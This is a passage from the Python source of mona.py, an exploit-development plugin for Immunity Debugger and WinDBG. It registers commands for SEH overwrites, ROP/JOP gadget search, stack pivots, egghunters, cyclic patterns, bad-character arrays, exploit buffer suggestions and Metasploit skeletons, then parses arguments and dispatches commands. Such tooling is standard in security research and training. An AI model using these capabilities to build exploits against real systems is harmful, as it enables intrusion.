Arguments:
    -f     : Full path to the file to read 
    -a     : address (or register) to write to""" 

	# initialize list of available mona commands
	global scriptname
	scriptname = get_script_name()
	launchcmd = scriptname
	if __DEBUGGERAPP__ == "WinDBG":
		launchcmd = "!py " + scriptname

	commands["help"] 			= MnCommand("help", "Show help", "%s help [command]" % launchcmd,procHelp,"h",[32,64])
	commands["seh"] 			= MnCommand("seh", "Find pointers to assist with SEH overwrite exploits",sehUsage, procFindSEH)
	commands["config"] 			= MnCommand("config","Manage configuration file (mona.ini)",configUsage,procConfig,"conf",[32,64])
	commands["jmp"]				= MnCommand("jmp","Find pointers that will allow you to jump to a register",jmpUsage,procFindJMP, "j",[32,64])
	commands["ropfunc"] 		= MnCommand("ropfunc","Find pointers to pointers (IAT) to interesting functions that can be used in your ROP chain",ropfuncUsage,procFindROPFUNC,"rf",[32,64])
	commands["rop"] 			= MnCommand("rop","Finds gadgets that can be used in a ROP chain and perhaps do some ROP magic with them",ropUsage,procROP,"",[32,64])
	commands["jop"] 			= MnCommand("jop","Finds gadgets that can be used in a JOP chain",jopUsage,procJOP,"",[32,64])		
	commands["jseh"]			= MnCommand("jseh", "Finds gadgets that can be used to bypass SafeSEH", jsehUsage, procJseh)
	commands["stackpivot"]		= MnCommand("stackpivot","Finds stackpivots (move stackpointer to controlled area)",stackpivotUsage,procStackPivots,"sp",[32,64])
	commands["modules"] 		= MnCommand("modules","Show all loaded modules and their properties",modulesUsage,procShowMODULES,"mod", [32,64])
	commands["moduleinfo"]		= MnCommand("moduleinfo","Show detailed info about a specific module",moduleInfoUsage,procModuleInfo,"modinfo", [32,64])
	commands["filecompare"]		= MnCommand("filecompare","Compares 2 or more files created by mona using the same output commands",filecompareUsage,procFileCOMPARE,"fc",[32,64])
	commands["pattern_create"]	= MnCommand("pattern_create","Create a cyclic pattern of a given size",patcreateUsage,procCreatePATTERN,"pc",[32,64])
	commands["pattern_offset"]	= MnCommand("pattern_offset","Find location of 4 bytes in a cyclic pattern",patoffsetUsage,procOffsetPATTERN,"po",[32,64])
	commands["find"] 			= MnCommand("find", "Find bytes in memory", findUsage, procFind,"f", [32,64])
	commands["findwild"]		= MnCommand("findwild", "Find instructions in memory, accepts wildcards", findwildUsage, procFindWild,"fw", [32,64])
	commands["assemble"] 		= MnCommand("assemble", "Convert instructions to opcode. Separate multiple instructions with #",assembleUsage,procAssemble,"asm", [32,64])
	commands["info"] 			= MnCommand("info", "Show information about a given address in the context of the loaded application",infoUsage,procInfo,"", [32,64])
	commands["dump"] 			= MnCommand("dump", "Dump the specified range of memory to a file", dumpUsage,procDump,"dmp", [32,64])
	commands["offset"]          = MnCommand("offset", "Calculate the number of bytes between two addresses", offsetUsage, procOffset, "os", [32,64])		
	#commands["compare"]			= MnCommand("compare","Compare contents of a binary file with a copy in memory", compareUsage, procCompare,"cmp")
	commands["compare"]			= MnCommand("compare","Compare a file created by msfvenom/gdb/hex/xxd/hexdump/ollydbg with a copy in memory", compareUsage, procCompare,"cmp", [32,64])
	commands["breakpoint"]		= MnCommand("bp","Set a breakpoint (software or hardware) at a given address", bpUsage, procBp,"bp", [32,64])
	commands["findmsp"]			= MnCommand("findmsp","Find cyclic pattern in memory", findmspUsage,procFindMSP,"findmsf", [32,64])
	commands["suggest"]			= MnCommand("suggest","Suggest an exploit buffer structure", suggestUsage,procSuggest,"sg", [32,64])
	commands["bytearray"]		= MnCommand("bytearray","Creates a byte array, can be used to find bad characters",bytearrayUsage,procByteArray,"ba", [32,64])
	commands["header"]			= MnCommand("header","Read a binary file and convert content to a nice 'header' string",headerUsage,procPrintHeader,"",[32,64])
	commands["update"]			= MnCommand("update","Update mona to the latest version",updateUsage,procUpdate,"up", [32, 64])
	commands["getpc"]			= MnCommand("getpc","Show getpc routines for specific registers",getpcUsage,procgetPC,"",[32, 64])	
	commands["egghunter"]		= MnCommand("egghunter","Create egghunter code",eggUsage,procEgg,"egg")
	commands["stacks"]			= MnCommand("stacks","Show all stacks for all threads in the running application",stacksUsage,procStacks,"",[32,64])
	commands["proclayout"]		= MnCommand("proclayout","Show unified process memory layout map",proclayoutUsage,procLayout,"pl",[32,64])
	commands["skeleton"]		= MnCommand("skeleton","Create a Metasploit module skeleton with a cyclic pattern for a given type of exploit",skeletonUsage,procSkeleton,"skel", [32,64])
	commands["breakfunc"]		= MnCommand("breakfunc","Set a breakpoint on an exported function in on or more dll's",bfUsage,procBf,"bf", [32,64])
	commands["heap"]			= MnCommand("heap","Show heap related information",heapUsage,procHeap,"hp", [32,64])
	commands["getiat"]			= MnCommand("getiat","Show IAT of selected module(s)",getiatUsage,procGetIAT,"iat", [32,64])
	commands["geteat"]          = MnCommand("geteat","Show EAT of selected module(s)",geteatUsage,procGetEAT,"eat", [32,64])
	commands["pageacl"]         = MnCommand("pageacl","Show ACL associated with mapped pages",getpageACLUsage,procPageACL,"pacl",[32,64] )
	commands["bpseh"]           = MnCommand("bpseh","Set a breakpoint on all current SEH Handler function pointers",bpsehUsage,procBPSeh,"sehbp")
	commands["encode"]			= MnCommand("encode","Encode a series of bytes",encUsage,procEnc,"enc")
	commands["unicodealign"]	= MnCommand("unicodealign","Generate venetian alignment code for unicode stack buffer overflow",unicodealignUsage,procUnicodeAlign,"ua")
	commands["load"]		= MnCommand("load","Copy bytes from file to a memory location",loadUsage,procLoad,"ld",[32,64])
	commands["fwptr"]			= MnCommand("fwptr", "Find Writeable Pointers that get called", fwptrUsage, procFwptr, "fwp")
	commands["sehchain"]		= MnCommand("sehchain","Show the current SEH chain",sehchainUsage,procSehChain,"exchain",[32])
	commands["hidedebug"]		= MnCommand("hidedebug","Attempt to hide the debugger",hidedebugUsage,procHideDebug,"hd",[32,64])
	commands["gflags"]			= MnCommand("gflags", "Show current GFlags settings from PEB.NtGlobalFlag", gflagsUsage, procFlags, "gf", [32,64])
	commands["infodump"]		= MnCommand("infodump","Dumps specific parts of memory to file", infodumpUsage, procInfoDump,"if",[32,64])
	commands["peb"]				= MnCommand("peb","Show location of the PEB",pebUsage,procPEB,"peb",[32,64])
	commands["teb"]				= MnCommand("teb","Show TEB related information",tebUsage,procTEB,"teb",[32,64])
	commands["string"]			= MnCommand("string","Read or write a string from/to memory",stringUsage,procString,"str",[32,64])
	commands["copy"]			= MnCommand("copy","Copy bytes from one location to another",copyUsage,procCopy,"cp",[32,64])
	commands["write"]           = MnCommand("write","Write a byte sequence to a location",writeUsage,procWrite,"w",[32,64])
	commands["?"]				= MnCommand("?","Evaluate an expression",evalUsage,procEval,"eval",[32,64])	
	commands["fillchunk"]	    = MnCommand("fillchunk","Fill a heap chunk referenced by an address expression",fillchunkUsage,procFillChunk,"fchunk",[32,64])
	if __DEBUGGERAPP__ == "Immunity Debugger":
		commands["deferbp"]		= MnCommand("deferbp","Set a deferred breakpoint",deferUsage,procBu,"bu")
	if __DEBUGGERAPP__ == "WinDBG":
		commands["dumpobj"]		= MnCommand("dumpobj","Dump the contents of an object",dumpobjUsage,procDumpObj,"do",[32,64])
		commands["dumplog"]     = MnCommand("dumplog","Dump objects present in alloc/free log file",dumplogUsage,procDumpLog,"dl",[32,64])
		commands["changeacl"]   = MnCommand("changeacl","Change the ACL of a given page",changeaclUsage,procChangeACL,"ca",[32,64])
		commands["allocmem"]	= MnCommand("allocmem","Allocate some memory in the process",allocmemUsage,procAllocMem,"alloc",[32,64])
		commands["tobp"]		= MnCommand("tobp","Generate WinDBG syntax to create a logging breakpoint at given location",tobpUsage,procToBp,"2bp",[32,64])
		commands["sym"]				= MnCommand("sym","Manage symbols: list status or clean cache", symUsage, procSym,"",[32,64])
	return


#
# Argument parsing routine
#

def _strip_launcher_and_script(argv):
	argv = list(argv)
	while len(argv) > 0:
		first_raw = str(argv[0]).strip().strip('"').strip("'")
		first_base = os.path.basename(first_raw).lower()

		if first_base in ["!py", "py", "mona.py", "mona"]:
			argv = argv[1:]
			continue
		break
	return argv


def _parse_mona_args_with_argparse(raw_args):

	try:
		_ = sys.argv
	except AttributeError:
		sys.argv = ["mona.py"]

	if sys.argv is None:
		sys.argv = ["mona.py"]

	parser = argparse.ArgumentParser(
		prog="mona.py",
		add_help=False
	)

	"""
	Return:
		command  : first token after script name (or "")
		monaArgs : dict with:
			- key = switch name without leading dashes
			- value = True for flags
			- value = string for switches with argument(s)
			- optional key "?" for free positional values after command
	"""
	# Python 3 only, so guard it
	try:
		parser.allow_abbrev = False
	except Exception:
		pass

	# Work on a copy
	argv = _strip_launcher_and_script(raw_args)

	# Common typo: -cbp instead of -cpb
	normalized_argv = []
	cbp_warned = False
	for token in argv:
		if token == "-cbp":
			if not cbp_warned:
				dbg.log("[!] Parameter '-cbp' detected. I believe you meant to use '-cpb', so I fixed that for you", highlight=1)
				cbp_warned = True
			normalized_argv.append("-cpb")
		else:
			normalized_argv.append(token)
	argv = normalized_argv

	# First remaining token is the command/alias, not an argument
	command = ""
	if len(argv) > 0:
		command = argv[0]
		argv = argv[1:]

	# Build parser dynamically from the actual tokens seen
	#
	# Example:
	#   -a 41414141 -t fileformat:pdf -s -cpb \x00\x0a
	#
	# becomes dynamically:
	#   parser.add_argument("-a", dest="a", nargs="+")
	#   parser.add_argument("-t", dest="t", nargs="+")
	#   parser.add_argument("-s", dest="s", action="store_true")
	#   parser.add_argument("-cpb", dest="cpb", nargs="+")
	#

	def _is_switch(t):
		"""A token is a switch if it starts with '-' followed by a letter.
		Values like -20000 or -0x1234 are not switches."""
		if not t.startswith("-") or t == "-":
			return False
		stripped = t.lstrip("-")
		return len(stripped) > 0 and stripped[0].isalpha()

	seen = set()
	duplicates = []
	i = 0
	while i < len(argv):
		token = argv[i]

		if _is_switch(token):
			opt = token

			if opt not in seen:
				dest = opt.lstrip("-").replace("-", "_")
				j = i + 1
				has_value = False

				# Collect all consecutive non-switch tokens as this option's value
				while j < len(argv):
					next_token = argv[j]
					if _is_switch(next_token):
						break
					has_value = True
					j += 1

				if has_value:
					parser.add_argument(opt, dest=dest, nargs="+")
				else:
					parser.add_argument(opt, dest=dest, action="store_true")

				seen.add(opt)
			else:
				duplicates.append(opt)

			# Skip over this option and any attached value tokens
			i += 1
			while i < len(argv):
				next_token = argv[i]
				if _is_switch(next_token):
					break
				i += 1
		else:
			# Positional token after the command; we'll catch it later via parse_known_args
			i += 1

	if duplicates:
		dbg.log("[!] Duplicate argument(s) found: %s" % ", ".join(duplicates), highlight=1)
		dbg.log("[!] Each argument should only be specified once")
		return command, {}

	try:
		parsed, extras = parser.parse_known_args(argv)
	except SystemExit:
		# argparse calls sys.exit() on error. Detect values that look
		# like negative numbers/hex which argparse mistakes for switches.
		suspect = [t for t in argv if t.startswith("-") and not _is_switch(t) and t != "-"]
		if suspect:
			dbg.log("[!] The following value(s) were interpreted as arguments instead of values: %s" % ", ".join(suspect), highlight=1)
			dbg.log("[!] Prefix hex values with 0x (e.g. 0x777664e8) or avoid leading dashes in values")
		else:
			dbg.log("[!] Failed to parse arguments: %s" % " ".join(argv), highlight=1)
		return command, {}

	monaArgs = {}
	for key, value in vars(parsed).items():
		if value is None:
			continue

		# turn dest back into original switch name style
		switch_name = key.replace("_", "-")

		if isinstance(value, list):
			monaArgs[switch_name] = " ".join([str(v) for v in value])
		else:
			monaArgs[switch_name] = value

	# Preserve free positional arguments after the command, if any
	if extras:
		monaArgs["?"] = " ".join([str(v) for v in extras])

	return command, monaArgs


#-----------------------------------------------------------------------#
# main itself. the boss.
#-----------------------------------------------------------------------#	



def main(args):
	dbg.createLogWindow()
	global currentArgs
	global scriptname
	global commands
	global DEBUG_MODE
	commands = {}
	# remove a stop file if it exists
	interruptMona(cleanup=True)

	currentArgs = copy.copy(args)
	if ("-debug" in args):
		DEBUG_MODE = True
		if __DEBUGGERAPP__ == "WinDBG":
			dbglib.set_debug_mode(True)
		dbg.log("*** Activating debug mode : %s ***" % DEBUG_MODE, highlight=True)
		if __DEBUGGERAPP__ == "WinDBG":
			# prepare an empty log file
			# so WinDBG can write its output to it
			windbglogfile = MnLog("%s-mona-windbg-debug.log" % get_current_datetime_flat())
			windbglog = windbglogfile.reset(clear = True, skipModuleTable = True)
			dbg.log("*** Writing WinDBG output to %s ***" % windbglog, highlight=True)
			dbg.nativeCommand(".logclose")
			dbg.nativeCommand(".logopen \"%s\"" % windbglog)
	else:
		DEBUG_MODE = False
		if (__DEBUGGERAPP__ == "WinDBG"):
			dbglib.set_debug_mode(False)

	try:
		starttime = datetime.datetime.now()

		thisversion,thisrevision = getVersionInfo(inspect.stack()[0][1])
		thisversion = thisversion.replace("'","")
		dbg.logLines("\n[ -- START -- ] Mona command started on %s (v%s, rev %s) %sbit " % (get_current_datetime(),thisversion,thisrevision, arch))
		dbg.log("[ -- START -- ] Python: %s)" % getPythonVersion())
		if __DEBUGGERAPP__ == "WinDBG":
			dbg.log("[ -- START -- ] PyKD: %s " % dbg.getPyKDVersionNr())
			if not g_keystoneLoaded and arch==64:
				dbg.log("[ -- START -- ] Keystone-engine NOT loaded")
		dbg.log("")

		ptr_counter = 0

		# fill up the commands dict
		populateCommands(args)

		dbgp("Initialized %d commands" % len(commands))
		
		# get the options
		last = ""
		arguments = []
		command = ""
		argcopy = copy.copy(args)

		aline = " ".join(a for a in argcopy)

		if __DEBUGGERAPP__ == "WinDBG":
			scriptname = get_script_name()
			aline = "!py " + aline
			dbg.log("[+] Command used: <b>%s</b>" % aline)
		else:
			scriptname = "mona"
			aline = "!mona " + aline
			dbg.log("[+] Command used: %s" % aline)

		if DEBUG_MODE:
			dbg.log("[+] Debug mode on")

		# in case we're not using Immunity
		if "-showargs" in args:
			dbg.log("-" * 50)
			dbg.log("args: %s" % args)

		command, monaArgs = _parse_mona_args_with_argparse(args)

		if "-showargs" in args:
			dbg.log("command: %s" % command)
			dbg.log("monaArgs: %s" % monaArgs)
			dbg.log("-" * 50)

		dbgp("Command: %s" % command)
		dbgp("Architecture: %s" % arch)
		dbgp("monaArgs: %s" % monaArgs)

		# ----- execute the chosen command ----- #
		dbgp("You're trying to run command '%s'" % command)
		dbgp("Args: %s" % monaArgs)

		# special case - if you are invoking a real command
		# but specified -h
		# then I need to run 'help' on that command
		if "h" in monaArgs:
			if monaArgs["h"] == True:
				# move the actual command to "?"
				monaArgs["?"] = command
				command = "help"

		dbg.log("")
		# make a list of all supported commands and aliases
		acceptedcommands = {}
		acceptedaliases = {}
		for monacommand in commands:
			maincmd = commands[monacommand].name
			aliascmd = commands[monacommand].alias
			acceptedcommands[maincmd] = commands[monacommand]
			acceptedaliases[aliascmd] = commands[monacommand]

		invokingCommand = None

		scriptname = get_script_name()
		launchcmd = "!" + scriptname		
		if __DEBUGGERAPP__ == "WinDBG":
			launchcmd = "!py " + scriptname

		if command == "":
			command = "help"

		# is user trying to run a valid command or alias?
		if command in acceptedcommands or command in acceptedaliases:
			# good. is it accepted on this architecture?
			arch_compatible = False
			if command in acceptedcommands:
				if arch in acceptedcommands[command].supportedarchs:
					arch_compatible = True
					invokingCommand = acceptedcommands[command]
			if command in acceptedaliases:
				if arch in acceptedaliases[command].supportedarchs:
					arch_compatible = True
					invokingCommand = acceptedaliases[command]

			if not arch_compatible:
				dbg.log("*** Sorry, command '%s' is not supported in %sbit ***" % (command, str(arch)), highlight = 1)
			else:
				# 'help' is a special case
				if invokingCommand.name == "help":
					if "?" in monaArgs:
						help_for_command = monaArgs["?"]
						helpForCommand = None
						dbgp("You're asking for help on using the '%s' command" % help_for_command)
						if help_for_command in acceptedcommands:
							helpForCommand = acceptedcommands[help_for_command]
						elif help_for_command in acceptedaliases:
							helpForCommand = acceptedaliases[help_for_command]
						invokingCommand.parseProc(monaArgs, helpForCommand )	
					else:
						invokingCommand.parseProc(monaArgs)	
				else:
					invokingCommand.parseProc(monaArgs)
		else:
			dbg.log("Sorry, command '%s' does not exist or is not supported" % command, highlight = 1)
			dbg.log("")
			dbg.logLines("Hint: run %s without arguments to see all global options\n      as well a list of all supported commands on %sbit" % (launchcmd, str(arch)), highlight=True)

		
		# ----- report ----- #
		endtime = datetime.datetime.now()
		delta = endtime - starttime
		dbg.log("")
		dbg.log("[ -- END -- ] %s | mona.py took %s" % (get_current_datetime(), str(delta)))
		if yesno():
			dbg.log("[ -- END -- ] Don't forget to check for updates from time to time: %s" % clickWinDBGCmd("!mona up"), highlight=True)
		dbg.setStatusBar("Done")
		if DEBUG_MODE and __DEBUGGERAPP__ == "WinDBG":
			dbg.nativeCommand(".logclose")
				
	except:
		dbg.log("*" * 80,highlight=True)
		dbg.logLines(traceback.format_exc(),highlight=True)
		dbg.log("*" * 80,highlight=True)
		dbg.error(traceback.format_exc())
	return ""


if __name__ == "__main__":
	dbg.log("Hold on...")
	# do we need to profile ?
	doprofile = False
	if "-profile" in sys.argv:
		doprofile = True
		dbg.log("Starting profiler...")
		cProfile.run('main(sys.argv)', 'monaprofile')
	else:
		main(sys.argv)
	if doprofile:
		dbg.log("[+] Showing profile stats...")
		p = pstats.Stats('monaprofile')	
		dbg.log(" ***** ALL *****")
		p.print_stats()		
		dbg.log(" ***** CUMULATIVE *****")
		p.sort_stats('cumulative').print_stats(30)
		dbg.log(" ***** TIME *****")
		p.sort_stats('time', 'cum').print_stats(30)
	# clear memory
	if __DEBUGGERAPP__ == "WinDBG":
		dbglib.clearvars()
	try:
		resetGlobals()
		dbg = None
	except:
		pass
